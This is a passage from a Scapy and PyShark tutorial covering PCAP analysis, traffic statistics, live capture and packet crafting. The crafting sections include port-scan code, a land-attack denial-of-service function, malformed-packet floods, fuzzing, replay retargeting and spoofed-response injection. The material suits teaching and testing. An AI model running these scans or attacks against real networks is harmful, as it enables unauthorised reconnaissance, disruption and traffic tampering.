>>> conf.iface              # Show default interface
>>> conf.iface = "eth0"     # Set interface
```

**Import and Basic Usage:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Show layer details
ls(IP)
ls(TCP)
ls(UDP)
ls(Ether)

# Show specific field details
IP().show()
TCP().show()
```

### Reading PCAP Files

**Basic PCAP Reading:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Read single PCAP
packets = rdpcap('capture.pcap')

# Print basic info
print(f"Total packets: {len(packets)}")

# Iterate through packets
for pkt in packets:
    print(pkt.summary())

# Access specific packet
first_packet = packets[0]
print(first_packet.show())
```

**Advanced PCAP Reading:**

```python
#!/usr/bin/env python3
from scapy.all import *

def analyze_pcap(filename):
    """Comprehensive PCAP analysis"""
    packets = rdpcap(filename)
    
    stats = {
        'total': len(packets),
        'tcp': 0,
        'udp': 0,
        'icmp': 0,
        'http': 0,
        'https': 0,
        'dns': 0,
        'unique_ips': set(),
        'unique_ports': set()
    }
    
    for pkt in packets:
        # Protocol counting
        if TCP in pkt:
            stats['tcp'] += 1
            stats['unique_ports'].add(pkt[TCP].dport)
            stats['unique_ports'].add(pkt[TCP].sport)
            
            if pkt[TCP].dport == 80 or pkt[TCP].sport == 80:
                stats['http'] += 1
            elif pkt[TCP].dport == 443 or pkt[TCP].sport == 443:
                stats['https'] += 1
        
        if UDP in pkt:
            stats['udp'] += 1
            if pkt[UDP].dport == 53 or pkt[UDP].sport == 53:
                stats['dns'] += 1
        
        if ICMP in pkt:
            stats['icmp'] += 1
        
        # IP tracking
        if IP in pkt:
            stats['unique_ips'].add(pkt[IP].src)
            stats['unique_ips'].add(pkt[IP].dst)
    
    # Print results
    print(f"Total Packets: {stats['total']}")
    print(f"TCP: {stats['tcp']}")
    print(f"UDP: {stats['udp']}")
    print(f"ICMP: {stats['icmp']}")
    print(f"HTTP: {stats['http']}")
    print(f"HTTPS: {stats['https']}")
    print(f"DNS: {stats['dns']}")
    print(f"Unique IPs: {len(stats['unique_ips'])}")
    print(f"Unique Ports: {len(stats['unique_ports'])}")
    
    return stats

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    
    analyze_pcap(sys.argv[1])
```

### Layer Access and Manipulation

**Accessing Packet Layers:**

```python
#!/usr/bin/env python3
from scapy.all import *

packets = rdpcap('capture.pcap')

for pkt in packets:
    # Check if layer exists
    if pkt.haslayer(TCP):
        print(f"TCP packet found")
    
    # Access layer using class
    if TCP in pkt:
        tcp_layer = pkt[TCP]
        print(f"Source Port: {tcp_layer.sport}")
        print(f"Dest Port: {tcp_layer.dport}")
        print(f"Flags: {tcp_layer.flags}")
    
    # Access layer using getlayer
    if pkt.haslayer(IP):
        ip_layer = pkt.getlayer(IP)
        print(f"Source IP: {ip_layer.src}")
        print(f"Dest IP: {ip_layer.dst}")
        print(f"TTL: {ip_layer.ttl}")
    
    # Access raw payload
    if Raw in pkt:
        payload = pkt[Raw].load
        print(f"Payload: {payload[:50]}")  # First 50 bytes
```

**Layer Stacking:**

```python
#!/usr/bin/env python3
from scapy.all import *

pkt = rdpcap('capture.pcap')[0]

# Show all layers
print(pkt.show())

# Access nested layers
if Ether in pkt:
    print(f"Ethernet Layer: {pkt[Ether].src} -> {pkt[Ether].dst}")
    
    if IP in pkt:
        print(f"IP Layer: {pkt[IP].src} -> {pkt[IP].dst}")
        
        if TCP in pkt:
            print(f"TCP Layer: {pkt[TCP].sport} -> {pkt[TCP].dport}")
            
            if Raw in pkt:
                print(f"Data: {pkt[Raw].load}")

# Alternative: iterate through layers
layer = pkt
while layer:
    print(f"Layer: {layer.__class__.__name__}")
    layer = layer.payload if hasattr(layer, 'payload') else None
```

### Filtering Packets

**Filter by Protocol:**

```python
#!/usr/bin/env python3
from scapy.all import *

packets = rdpcap('capture.pcap')

# Filter TCP packets
tcp_packets = [pkt for pkt in packets if TCP in pkt]
print(f"TCP packets: {len(tcp_packets)}")

# Filter by port
http_packets = [pkt for pkt in packets if TCP in pkt and (pkt[TCP].dport == 80 or pkt[TCP].sport == 80)]
print(f"HTTP packets: {len(http_packets)}")

# Filter by IP address
target_ip = "192.168.1.100"
target_packets = [pkt for pkt in packets if IP in pkt and (pkt[IP].src == target_ip or pkt[IP].dst == target_ip)]
print(f"Packets involving {target_ip}: {len(target_packets)}")

# Filter by multiple conditions
def complex_filter(pkt):
    return (TCP in pkt and 
            pkt[TCP].dport == 443 and 
            IP in pkt and 
            pkt[IP].src.startswith('192.168.'))

filtered = [pkt for pkt in packets if complex_filter(pkt)]
print(f"Complex filtered packets: {len(filtered)}")
```

**BPF Filter Support:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Use Berkeley Packet Filter syntax
packets = sniff(offline='capture.pcap', filter='tcp port 80')
print(f"HTTP packets: {len(packets)}")

# Complex BPF filters
packets = sniff(offline='capture.pcap', 
                filter='tcp and (port 80 or port 443) and src net 192.168.0.0/16')
```

### Writing PCAP Files

**Save Packets:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Read and filter
packets = rdpcap('capture.pcap')
http_packets = [pkt for pkt in packets if TCP in pkt and pkt[TCP].dport == 80]

# Write to new PCAP
wrpcap('http_only.pcap', http_packets)

# Append to existing PCAP
wrpcap('http_only.pcap', http_packets, append=True)

# Write pcapng format
wrpcap('output.pcapng', http_packets, nano=True)
```

### Packet Statistics and Analysis

**Generate Statistics:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import Counter, defaultdict

def packet_statistics(pcap_file):
    """Generate comprehensive packet statistics"""
    packets = rdpcap(pcap_file)
    
    stats = {
        'protocol_distribution': Counter(),
        'port_distribution': Counter(),
        'ip_pairs': Counter(),
        'packet_sizes': [],
        'timestamps': [],
        'tcp_flags': Counter()
    }
    
    for pkt in packets:
        # Protocol distribution
        if IP in pkt:
            stats['protocol_distribution'][pkt[IP].proto] += 1
            stats['ip_pairs'][(pkt[IP].src, pkt[IP].dst)] += 1
        
        # Port distribution
        if TCP in pkt:
            stats['port_distribution'][pkt[TCP].dport] += 1
            stats['port_distribution'][pkt[TCP].sport] += 1
            stats['tcp_flags'][str(pkt[TCP].flags)] += 1
        elif UDP in pkt:
            stats['port_distribution'][pkt[UDP].dport] += 1
            stats['port_distribution'][pkt[UDP].sport] += 1
        
        # Packet size
        stats['packet_sizes'].append(len(pkt))
        
        # Timestamp
        if hasattr(pkt, 'time'):
            stats['timestamps'].append(float(pkt.time))
    
    # Print results
    print("\n=== Protocol Distribution ===")
    for proto, count in stats['protocol_distribution'].most_common(10):
        proto_name = {6: 'TCP', 17: 'UDP', 1: 'ICMP'}.get(proto, f'Unknown({proto})')
        print(f"{proto_name}: {count}")
    
    print("\n=== Top 10 Ports ===")
    for port, count in stats['port_distribution'].most_common(10):
        print(f"Port {port}: {count}")
    
    print("\n=== Top 10 IP Conversations ===")
    for (src, dst), count in stats['ip_pairs'].most_common(10):
        print(f"{src} -> {dst}: {count}")
    
    print("\n=== TCP Flags Distribution ===")
    for flags, count in stats['tcp_flags'].most_common():
        print(f"Flags {flags}: {count}")
    
    if stats['packet_sizes']:
        print(f"\n=== Packet Size Statistics ===")
        print(f"Min: {min(stats['packet_sizes'])} bytes")
        print(f"Max: {max(stats['packet_sizes'])} bytes")
        print(f"Average: {sum(stats['packet_sizes'])/len(stats['packet_sizes']):.2f} bytes")
    
    if len(stats['timestamps']) > 1:
        print(f"\n=== Time Statistics ===")
        duration = stats['timestamps'][-1] - stats['timestamps'][0]
        print(f"Capture duration: {duration:.2f} seconds")
        print(f"Packets per second: {len(packets)/duration:.2f}")
    
    return stats

# Usage
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <pcap_file>")
        sys.exit(1)
    
    packet_statistics(sys.argv[1])
```

### Live Packet Capture

**Basic Sniffing:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Capture 10 packets
packets = sniff(count=10)
packets.summary()

# Capture with filter
packets = sniff(filter="tcp port 80", count=20)

# Capture on specific interface
packets = sniff(iface="eth0", count=50)

# Capture with timeout
packets = sniff(timeout=30)  # 30 seconds
```

**Sniffing with Callback:**

```python
#!/usr/bin/env python3
from scapy.all import *

def packet_callback(pkt):
    """Process each packet as it's captured"""
    if IP in pkt:
        print(f"{pkt[IP].src} -> {pkt[IP].dst}")
        
        if TCP in pkt:
            print(f"  TCP {pkt[TCP].sport} -> {pkt[TCP].dport}")
        elif UDP in pkt:
            print(f"  UDP {pkt[UDP].sport} -> {pkt[UDP].dport}")

# Sniff with callback (runs indefinitely)
sniff(prn=packet_callback, filter="ip", store=False)

# Store=False prevents storing packets in memory (better for long captures)
```

**Advanced Sniffing with Store:**

```python
#!/usr/bin/env python3
from scapy.all import *

captured_packets = []

def process_and_store(pkt):
    """Process and conditionally store packets"""
    if TCP in pkt and pkt[TCP].dport == 443:
        captured_packets.append(pkt)
        print(f"Captured HTTPS packet: {pkt[IP].src} -> {pkt[IP].dst}")
        
        # Stop after 100 HTTPS packets
        if len(captured_packets) >= 100:
            return True  # Stop sniffing
    
    return False

# Sniff until stop condition
sniff(prn=process_and_store, stop_filter=lambda x: len(captured_packets) >= 100)

# Save captured packets
wrpcap('https_traffic.pcap', captured_packets)
print(f"Saved {len(captured_packets)} packets")
```

### Protocol-Specific Operations

**HTTP Analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *

def extract_http_data(pcap_file):
    """Extract HTTP requests and responses"""
    packets = rdpcap(pcap_file)
    
    http_requests = []
    http_responses = []
    
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            payload = pkt[Raw].load
            
            try:
                payload_str = payload.decode('utf-8', errors='ignore')
                
                # HTTP Request
                if payload_str.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ', 'HEAD ')):
                    lines = payload_str.split('\r\n')
                    request_line = lines[0]
                    headers = {}
                    
                    for line in lines[1:]:
                        if ':' in line:
                            key, value = line.split(':', 1)
                            headers[key.strip()] = value.strip()
                    
                    http_requests.append({
                        'src': pkt[IP].src,
                        'dst': pkt[IP].dst,
                        'request_line': request_line,
                        'host': headers.get('Host', 'Unknown'),
                        'user_agent': headers.get('User-Agent', 'Unknown'),
                        'headers': headers
                    })
                
                # HTTP Response
                elif payload_str.startswith('HTTP/'):
                    lines = payload_str.split('\r\n')
                    status_line = lines[0]
                    
                    http_responses.append({
                        'src': pkt[IP].src,
                        'dst': pkt[IP].dst,
                        'status_line': status_line
                    })
            
            except:
                pass
    
    return http_requests, http_responses

# Usage
requests, responses = extract_http_data('capture.pcap')

print(f"\n=== HTTP Requests ({len(requests)}) ===")
for req in requests[:10]:  # Show first 10
    print(f"{req['request_line']}")
    print(f"  Host: {req['host']}")
    print(f"  User-Agent: {req['user_agent'][:50]}")
    print()
```

**DNS Analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *

def analyze_dns(pcap_file):
    """Extract and analyze DNS queries and responses"""
    packets = rdpcap(pcap_file)
    
    dns_queries = []
    dns_responses = []
    
    for pkt in packets:
        if DNS in pkt:
            dns_layer = pkt[DNS]
            
            # DNS Query
            if dns_layer.qr == 0 and dns_layer.qd:
                qname = dns_layer.qd.qname.decode('utf-8', errors='ignore')
                qtype = dns_layer.qd.qtype
                
                dns_queries.append({
                    'src': pkt[IP].src if IP in pkt else 'Unknown',
                    'query': qname,
                    'type': qtype,
                    'type_name': {1: 'A', 2: 'NS', 5: 'CNAME', 6: 'SOA', 
                                  12: 'PTR', 15: 'MX', 16: 'TXT', 28: 'AAAA'}.get(qtype, f'Type{qtype}')
                })
            
            # DNS Response
            elif dns_layer.qr == 1 and dns_layer.an:
                qname = dns_layer.qd.qname.decode('utf-8', errors='ignore') if dns_layer.qd else 'Unknown'
                answers = []
                
                for i in range(dns_layer.ancount):
                    if dns_layer.an[i].type == 1:  # A record
                        answers.append(dns_layer.an[i].rdata)
                    elif dns_layer.an[i].type == 5:  # CNAME
                        answers.append(dns_layer.an[i].rdata.decode('utf-8', errors='ignore'))
                
                dns_responses.append({
                    'query': qname,
                    'answers': answers
                })
    
    # Print statistics
    print(f"\n=== DNS Statistics ===")
    print(f"Total Queries: {len(dns_queries)}")
    print(f"Total Responses: {len(dns_responses)}")
    
    # Top queried domains
    from collections import Counter
    query_counter = Counter([q['query'] for q in dns_queries])
    print(f"\n=== Top 10 Queried Domains ===")
    for domain, count in query_counter.most_common(10):
        print(f"{domain}: {count}")
    
    # Query types
    type_counter = Counter([q['type_name'] for q in dns_queries])
    print(f"\n=== Query Types ===")
    for qtype, count in type_counter.most_common():
        print(f"{qtype}: {count}")
    
    return dns_queries, dns_responses

# Usage
queries, responses = analyze_dns('capture.pcap')
```

### TCP Stream Reconstruction

**Follow TCP Stream:**

```python
#!/usr/bin/env python3
from scapy.all import *

def reconstruct_tcp_stream(pcap_file, src_ip, dst_ip, src_port, dst_port):
    """Reconstruct TCP stream between two endpoints"""
    packets = rdpcap(pcap_file)
    
    stream_data = {
        'client_to_server': b'',
        'server_to_client': b''
    }
    
    for pkt in packets:
        if TCP in pkt and IP in pkt and Raw in pkt:
            # Client to Server
            if (pkt[IP].src == src_ip and pkt[IP].dst == dst_ip and
                pkt[TCP].sport == src_port and pkt[TCP].dport == dst_port):
                stream_data['client_to_server'] += pkt[Raw].load
            
            # Server to Client
            elif (pkt[IP].src == dst_ip and pkt[IP].dst == src_ip and
                  pkt[TCP].sport == dst_port and pkt[TCP].dport == src_port):
                stream_data['server_to_client'] += pkt[Raw].load
    
    return stream_data

# Usage
stream = reconstruct_tcp_stream('capture.pcap', '192.168.1.100', '93.184.216.34', 54321, 80)

print("=== Client to Server ===")
print(stream['client_to_server'][:500].decode('utf-8', errors='ignore'))

print("\n=== Server to Client ===")
print(stream['server_to_client'][:500].decode('utf-8', errors='ignore'))
```

**Automatic Stream Extraction:**

```python
#!/usr/bin/env python3
from scapy.all import *
from collections import defaultdict

def extract_all_tcp_streams(pcap_file):
    """Extract all TCP streams from PCAP"""
    packets = rdpcap(pcap_file)
    
    streams = defaultdict(lambda: {'data': b'', 'packets': []})
    
    for pkt in packets:
        if TCP in pkt and IP in pkt:
            # Create stream identifier (normalize direction)
            src_ip, dst_ip = pkt[IP].src, pkt[IP].dst
            src_port, dst_port = pkt[TCP].sport, pkt[TCP].dport
            
            # Normalize: smaller IP first
            if (src_ip, src_port) > (dst_ip, dst_port):
                src_ip, dst_ip = dst_ip, src_ip
                src_port, dst_port = dst_port, src_port
            
            stream_id = (src_ip, dst_ip, src_port, dst_port)
            streams[stream_id]['packets'].append(pkt)
            
            if Raw in pkt:
                streams[stream_id]['data'] += pkt[Raw].load
    
    return streams

# Usage
streams = extract_all_tcp_streams('capture.pcap')

print(f"Total TCP streams: {len(streams)}")
for stream_id, stream_data in list(streams.items())[:5]:
    src_ip, dst_ip, src_port, dst_port = stream_id
    print(f"\nStream: {src_ip}:{src_port} <-> {dst_ip}:{dst_port}")
    print(f"  Packets: {len(stream_data['packets'])}")
    print(f"  Data size: {len(stream_data['data'])} bytes")
    print(f"  Sample: {stream_data['data'][:100]}")
```

## Packet Crafting

### Basic Packet Creation

**Create Simple Packets:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Create IP packet
ip_pkt = IP(dst="192.168.1.1")
ip_pkt.show()

# Create TCP packet
tcp_pkt = TCP(dport=80, flags="S")
tcp_pkt.show()

# Stack layers
packet = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
packet.show()

# Send packet
send(packet)

# Send and receive response
response = sr1(packet, timeout=2)
if response:
    response.show()
```

**Layer Construction:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Ethernet + IP + TCP + Data
packet = (Ether(dst="ff:ff:ff:ff:ff:ff") /
          IP(dst="192.168.1.1") /
          TCP(dport=80, flags="S") /
          Raw(load="Hello World"))

# Set specific fields
packet[IP].ttl = 64
packet[TCP].sport = 12345
packet[TCP].seq = 1000

packet.show()
```

### TCP Three-Way Handshake

**Manual SYN Scan:**

```python
#!/usr/bin/env python3
from scapy.all import *

def syn_scan(target, ports):
    """Perform SYN scan on target ports"""
    open_ports = []
    
    for port in ports:
        # Craft SYN packet
        pkt = IP(dst=target)/TCP(dport=port, flags="S")
        
        # Send and wait for response
        response = sr1(pkt, timeout=1, verbose=0)
        
        if response and response.haslayer(TCP):
            if response[TCP].flags == 0x12:  # SYN-ACK
                open_ports.append(port)
                print(f"[+] Port {port}: OPEN")
                
                # Send RST to close connection
                rst_pkt = IP(dst=target)/TCP(dport=port, flags="R")
                send(rst_pkt, verbose=0)
            
            elif response[TCP].flags == 0x14:  # RST-ACK
                print(f"[-] Port {port}: CLOSED")
        else:
            print(f"[?] Port {port}: FILTERED")
    
    return open_ports

# Usage
target_ip = "192.168.1.100"
ports_to_scan = [21, 22, 80, 443, 8080]

print(f"Scanning {target_ip}...")
open_ports = syn_scan(target_ip, ports_to_scan)

print(f"\nOpen ports: {open_ports}")
```

**Complete Three-Way Handshake:**

```python
#!/usr/bin/env python3
from scapy.all import *
import random

def tcp_handshake(target, port):
    """Perform complete TCP three-way handshake"""
    
    # Step 1: Send SYN
    src_port = random.randint(1024, 65535)
    seq_num = random.randint(0, 2**32 - 1)
    
    syn = IP(dst=target)/TCP(sport=src_port, dport=port, flags="S", seq=seq_num)
    print("[1] Sending SYN...")
    syn_ack = sr1(syn, timeout=2, verbose=0)
    
    if not syn_ack or not syn_ack.haslayer(TCP):
        print("[-] No response")
        return None
    
    if syn_ack[TCP].flags != 0x12:  # Not SYN-ACK
        print("[-] Port closed or filtered")
        return None
    
    print("[2] Received SYN-ACK")
    
    # Step 3: Send ACK
    ack = IP(dst=target)/TCP(sport=src_port, dport=port, flags="A", 
                              seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
    send(ack, verbose=0)
    print("[3] Sent ACK - Connection established")
    
    return {
        'src_port': src_port,
        'dst_port': port,
        'seq': syn_ack[TCP].ack,
        'ack': syn_ack[TCP].seq + 1
    }

# Usage
connection = tcp_handshake("192.168.1.100", 80)
if connection:
    print(f"Connection params: {connection}")
```

### Custom Protocol Packets

**ICMP Packets:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Ping (ICMP Echo Request)
ping = IP(dst="8.8.8.8")/ICMP()
response = sr1(ping, timeout=2)

if response:
    print(f"Ping successful: {response[IP].src}")
    print(f"TTL: {response[IP].ttl}")

# Custom ICMP types
# Type 8: Echo Request
# Type 0: Echo Reply
# Type 3: Destination Unreachable
# Type 11: Time Exceeded

# ICMP Destination Unreachable
unreachable = IP(dst="192.168.1.100")/ICMP(type=3, code=3)  # Port Unreachable
send(unreachable)

# ICMP with custom payload
ping_data = IP(dst="192.168.1.1")/ICMP()/Raw(load="CustomPayload123")
response = sr1(ping_data, timeout=2)
```

**UDP Packets:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Simple UDP packet
udp_pkt = IP(dst="192.168.1.1")/UDP(dport=53)/Raw(load="test data")
send(udp_pkt)

# DNS Query (UDP)
dns_query = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, timeout=2)

if response and response.haslayer(DNS):
    print(f"DNS Response:")
    print(f"  Query: {response[DNS].qd.qname}")
    if response[DNS].an:
        print(f"  Answer: {response[DNS].an.rdata}")

# UDP scan
def udp_scan(target, port):
    """UDP port scan"""
    pkt = IP(dst=target)/UDP(dport=port)
    response = sr1(pkt, timeout=2, verbose=0)
    
    if response is None:
        return "open|filtered"
    elif response.haslayer(ICMP):
        if response[ICMP].type == 3 and response[ICMP].code == 3:
            return "closed"
    elif response.haslayer(UDP):
        return "open"
    
    return "unknown"

# Usage
print(f"Port 53: {udp_scan('8.8.8.8', 53)}")
print(f"Port 161: {udp_scan('192.168.1.1', 161)}")
```

**ARP Packets:**

```python
#!/usr/bin/env python3
from scapy.all import *

# ARP Request (who-has)
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.1")
response = srp1(arp_request, timeout=2, verbose=0)

if response:
    print(f"IP: {response[ARP].psrc}")
    print(f"MAC: {response[ARP].hwsrc}")

# ARP Scan (scan network range)
def arp_scan(network):
    """Scan network using ARP"""
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network)
    answered, unanswered = srp(arp_request, timeout=2, verbose=0)
    
    hosts = []
    for sent, received in answered:
        hosts.append({
            'ip': received[ARP].psrc,
            'mac': received[ARP].hwsrc
        })
    
    return hosts

# Usage
print("Scanning network...") 
hosts = arp_scan("192.168.1.0/24")

for host in hosts: 
	print(f"{host['ip']:15s} -> {host['mac']}")
````

### Malformed Packets

**Crafting Anomalous Packets:**
```python
#!/usr/bin/env python3
from scapy.all import *

# NULL scan (no flags set)
null_scan = IP(dst="192.168.1.100")/TCP(dport=80, flags="")
response = sr1(null_scan, timeout=2, verbose=0)

# FIN scan
fin_scan = IP(dst="192.168.1.100")/TCP(dport=80, flags="F")
response = sr1(fin_scan, timeout=2, verbose=0)

# XMAS scan (FIN, PSH, URG)
xmas_scan = IP(dst="192.168.1.100")/TCP(dport=80, flags="FPU")
response = sr1(xmas_scan, timeout=2, verbose=0)

# Invalid TCP flags combination
invalid_flags = IP(dst="192.168.1.100")/TCP(dport=80, flags="SFR")
send(invalid_flags)

# Fragmented packet
frag_pkt = IP(dst="192.168.1.100", flags="MF")/ICMP()/("X"*1500)
send(fragment(frag_pkt))

# Invalid IP header values
invalid_ip = IP(dst="192.168.1.100", ttl=0)/ICMP()
send(invalid_ip)

# Oversized packet
oversized = IP(dst="192.168.1.100")/ICMP()/Raw(load="X"*65000)
send(fragment(oversized))
````

**Land Attack (Same Source and Destination):**

```python
#!/usr/bin/env python3
from scapy.all import *

def land_attack(target, port):
    """
    Land attack: packet with same source and destination
    [Inference] For educational/testing purposes only
    """
    pkt = IP(src=target, dst=target)/TCP(sport=port, dport=port, flags="S")
    send(pkt, verbose=0)
    print(f"[!] Land attack packet sent to {target}:{port}")

# Usage (test environment only)
# land_attack("192.168.1.100", 80)
```

### Packet Fuzzing

**Basic Fuzzing:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Fuzz specific fields
template = IP(dst="192.168.1.100")/TCP(dport=80)

# Fuzz TCP flags
for i in range(256):
    pkt = template.copy()
    pkt[TCP].flags = i
    send(pkt, verbose=0)
    print(f"Sent packet with flags: {i:08b}")

# Using fuzz() function
fuzzed_pkt = IP(dst="192.168.1.100")/fuzz(TCP(dport=80))
send(fuzzed_pkt)

# Fuzz multiple packets
for i in range(10):
    send(IP(dst="192.168.1.100")/fuzz(TCP(dport=80)), verbose=0)
```

**Targeted Fuzzing:**

```python
#!/usr/bin/env python3
from scapy.all import *
import random

def fuzz_http_header(target, port):
    """Fuzz HTTP headers"""
    
    # Base HTTP request
    http_methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS", "TRACE"]
    
    for method in http_methods:
        for i in range(5):
            # Generate random header value
            random_value = ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                                  for _ in range(random.randint(10, 100)))
            
            http_request = f"{method} / HTTP/1.1\r\n"
            http_request += f"Host: {target}\r\n"
            http_request += f"X-Fuzz-Header: {random_value}\r\n"
            http_request += "Connection: close\r\n\r\n"
            
            pkt = IP(dst=target)/TCP(dport=port, flags="PA")/Raw(load=http_request)
            send(pkt, verbose=0)
            print(f"Sent: {method} with fuzzed header length {len(random_value)}")

# Usage (test environment only)
# fuzz_http_header("192.168.1.100", 80)
```

### Packet Replay and Modification

**Replay Captured Packets:**

```python
#!/usr/bin/env python3
from scapy.all import *

def replay_packets(pcap_file, target_ip=None):
    """Replay packets from PCAP, optionally changing destination"""
    packets = rdpcap(pcap_file)
    
    for pkt in packets:
        if target_ip and IP in pkt:
            # Change destination IP
            pkt[IP].dst = target_ip
            # Recalculate checksums
            del pkt[IP].chksum
            if TCP in pkt:
                del pkt[TCP].chksum
            elif UDP in pkt:
                del pkt[UDP].chksum
        
        send(pkt, verbose=0)
        print(f"Replayed: {pkt.summary()}")

# Usage
# replay_packets('captured.pcap', target_ip='192.168.1.200')
```

**Modify and Resend:**

```python
#!/usr/bin/env python3
from scapy.all import *

def modify_and_replay(pcap_file):
    """Modify specific fields before replaying"""
    packets = rdpcap(pcap_file)
    
    modified_packets = []
    
    for pkt in packets:
        if TCP in pkt and Raw in pkt:
            # Modify payload
            original_payload = pkt[Raw].load
            modified_payload = original_payload.replace(b'original', b'modified')
            
            # Create new packet with modified payload
            new_pkt = pkt.copy()
            new_pkt[Raw].load = modified_payload
            
            # Recalculate checksums
            del new_pkt[IP].chksum
            del new_pkt[TCP].chksum
            
            modified_packets.append(new_pkt)
    
    # Save or send modified packets
    wrpcap('modified.pcap', modified_packets)
    return modified_packets

# Usage
modified = modify_and_replay('original.pcap')
```

### Advanced Packet Crafting

**TCP with Options:**

```python
#!/usr/bin/env python3
from scapy.all import *

# TCP with MSS option
tcp_mss = TCP(dport=80, flags="S", options=[('MSS', 1460)])
pkt = IP(dst="192.168.1.100")/tcp_mss
send(pkt)

# TCP with multiple options
tcp_opts = TCP(dport=80, flags="S", options=[
    ('MSS', 1460),
    ('SAckOK', ''),
    ('Timestamp', (123456, 0)),
    ('NOP', None),
    ('WScale', 7)
])
pkt = IP(dst="192.168.1.100")/tcp_opts
send(pkt)
```

**Custom Payloads:**

```python
#!/usr/bin/env python3
from scapy.all import *
import struct

# Binary payload
binary_data = struct.pack('!I', 0xDEADBEEF) + struct.pack('!H', 1234)
pkt = IP(dst="192.168.1.100")/TCP(dport=80)/Raw(load=binary_data)
send(pkt)

# Encoded payload
import base64
encoded_data = base64.b64encode(b"Secret Message")
pkt = IP(dst="192.168.1.100")/UDP(dport=1234)/Raw(load=encoded_data)
send(pkt)

# Pattern for buffer overflow testing
pattern = b"A" * 100 + b"B" * 4 + b"C" * 100
pkt = IP(dst="192.168.1.100")/TCP(dport=9999)/Raw(load=pattern)
send(pkt)
```

### Packet Injection in Live Capture

**Inject During Sniffing:**

```python
#!/usr/bin/env python3
from scapy.all import *

def inject_response(pkt):
    """Inject forged response to captured request"""
    if TCP in pkt and pkt[TCP].dport == 80 and Raw in pkt:
        payload = pkt[Raw].load
        
        if b'GET' in payload:
            # Craft spoofed response
            spoofed = IP(src=pkt[IP].dst, dst=pkt[IP].src)/\
                     TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
                         flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq + len(payload))/\
                     Raw(load="HTTP/1.1 200 OK\r\n\r\nSpoofed Response")
            
            send(spoofed, verbose=0)
            print(f"[!] Injected response to {pkt[IP].src}")

# Sniff and inject
sniff(prn=inject_response, filter="tcp port 80", store=False)
```

## PyShark Automation

### Installation and Setup

**Install PyShark:**

```bash
# Install tshark (required)
apt-get install tshark

# Install PyShark
pip3 install pyshark

# Grant tshark capture permissions
sudo dpkg-reconfigure wireshark-common
sudo usermod -a -G wireshark $USER
```

### Basic PyShark Operations

**Reading PCAP Files:**

```python
#!/usr/bin/env python3
import pyshark

# Open PCAP file
cap = pyshark.FileCapture('capture.pcap')

# Iterate through packets
for packet in cap:
    print(packet)

# Access packet layers
cap = pyshark.FileCapture('capture.pcap')
for packet in cap:
    if hasattr(packet, 'ip'):
        print(f"IP: {packet.ip.src} -> {packet.ip.dst}")
    
    if hasattr(packet, 'tcp'):
        print(f"TCP: {packet.tcp.srcport} -> {packet.tcp.dstport}")

# Close capture
cap.close()
```

**Display Filters:**

```python
#!/usr/bin/env python3
import pyshark

# Apply display filter
cap = pyshark.FileCapture('capture.pcap', display_filter='http')

for packet in cap:
    if hasattr(packet, 'http'):
        print(f"HTTP Request: {packet.http.request_uri if hasattr(packet.http, 'request_uri') else 'N/A'}")

# Multiple filter conditions
cap = pyshark.FileCapture('capture.pcap', 
                          display_filter='tcp.port == 443 and ip.src == 192.168.1.100')

# BPF filter (capture filter)
cap = pyshark.FileCapture('capture.pcap', bpf_filter='tcp port 80')
```

### Live Capture

**Capture Live Traffic:**

```python
#!/usr/bin/env python3
import pyshark

# Capture on interface
cap = pyshark.LiveCapture(interface='eth0')

# Capture specific number of packets
cap.sniff(packet_count=10)

for packet in cap:
    print(packet)

# Capture with timeout
cap = pyshark.LiveCapture(interface='eth0')
cap.sniff(timeout=30)  # 30 seconds

# Capture with filter
cap = pyshark.LiveCapture(interface='eth0', bpf_filter='tcp port 443')
cap.sniff(packet_count=50)
```

**Callback-Based Capture:**

```python
#!/usr/bin/env python3
import pyshark

def packet_callback(packet):
    """Process each packet"""
    try:
        if hasattr(packet, 'ip'):
            print(f"{packet.ip.src} -> {packet.ip.dst}")
            
            if hasattr(packet, 'tcp'):
                print(f"  TCP Port: {packet.tcp.dstport}")
            elif hasattr(packet, 'udp'):
                print(f"  UDP Port: {packet.udp.dstport}")
    except AttributeError:
        pass

# Capture with callback
cap = pyshark.LiveCapture(interface='eth0')
cap.apply_on_packets(packet_callback, timeout=30)
```

### Advanced PyShark Features

**Accessing Layer Details:**

```python
#!/usr/bin/env python3
import pyshark

cap = pyshark.FileCapture('capture.pcap')

for packet in cap:
    # List all layers
    print(f"Layers: {packet.layers}")
    
    # Access specific layer fields
    if hasattr(packet, 'tcp'):
        tcp_layer = packet.tcp
        
        # Get all field names
        print(f"TCP Fields: {tcp_layer.field_names}")
        
        # Access specific fields
        print(f"Source Port: {tcp_layer.srcport}")
        print(f"Dest Port: {tcp_layer.dstport}")
        print(f"Seq: {tcp_layer.seq}")
        print(f"Ack: {tcp_layer.ack}")
        print(f"Flags: {tcp_layer.flags}")
        
        # Check if field exists
        if hasattr(tcp_layer, 'payload'):
            print(f"Payload: {tcp_layer.payload}")
```

